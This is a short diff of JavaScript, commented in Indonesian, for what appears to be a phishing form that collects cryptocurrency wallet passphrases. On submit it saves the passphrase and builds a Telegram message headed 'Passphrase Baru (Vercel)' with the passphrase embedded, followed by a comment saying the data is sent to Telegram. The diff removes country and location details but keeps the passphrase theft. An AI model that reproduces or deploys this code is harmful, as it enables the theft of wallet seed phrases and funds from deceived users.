@@ -20,13 +20,8 @@ document.querySelector('form').addEventListener('submit', function(e) {
   localStorage.setItem('walletPassphrase', normalized);
 
   // Format pesan untuk Telegram
-  var lang = navigator.language || 'id-ID';
-  var country = lang.split('-')[1] || lang;
-  var locationInfo = Intl.DateTimeFormat().resolvedOptions().timeZone || 'unknown';
   var message = "<b>🔔 Passphrase Baru (Vercel)</b>\n" +
-                "<b>Waktu:</b> " + new Date().toLocaleString('id-ID') + "\n" +
-                "<b>Negara:</b> " + country + "\n" +
-                "<b>Lokasi:</b> " + locationInfo + "\n\n" +
+                "<b>Waktu:</b> " + new Date().toLocaleString('id-ID') + "\n\n" +
                 "<code>" + normalized + "</code>";
 
   // Kirim data ke Telegram
